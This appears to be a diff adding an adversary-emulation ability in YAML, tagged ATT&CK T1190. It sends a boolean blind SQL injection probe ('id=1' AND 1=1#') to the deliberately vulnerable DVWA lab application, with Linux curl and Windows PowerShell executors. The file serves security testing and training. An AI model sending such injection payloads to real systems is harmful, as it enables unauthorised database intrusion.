@@ -1,0 +1,28 @@
+- id: a1b2c3d4-dvwa-0006-bsql-000000000006
+  name: DVWA - Blind SQL Injection Probe (Low)
+  description: Injects boolean/time conditions into DVWA Blind SQLi endpoint
+  tactic: initial-access
+  technique_id: T1190
+  technique_name: Exploit Public-Facing Application
+  repeatable: false
+  executors:
+    - name: sh
+      platform: linux
+      command: |
+        DVWA_URL="${DVWA_URL:-http://127.0.0.1:80/dvwa}"
+        COOKIE_FILE="/tmp/dvwa_cookie.txt"
+        curl -s -b "$COOKIE_FILE" -b "security=low" \
+          "$DVWA_URL/vulnerabilities/sqli_blind/?id=1%27+AND+1%3D1%23&Submit=Submit" > /dev/null || true
+        echo "[+] Sent Blind SQL Injection request"
+        exit 0
+      timeout: 30
+    - name: psh
+      platform: windows
+      command: |
+        $DvwaUrl = if ($env:DVWA_URL) { $env:DVWA_URL } else { "http://127.0.0.1:80/dvwa" }
+        $CookieFile = "$env:TEMP\dvwa_cookie.txt"
+        curl.exe -s -b "$CookieFile" -b "security=low" `
+          "$DvwaUrl/vulnerabilities/sqli_blind/?id=1%27+AND+1%3D1%23&Submit=Submit" | Out-Null
+        Write-Output "[+] Sent Blind SQL Injection request"
+        exit 0
+      timeout: 30
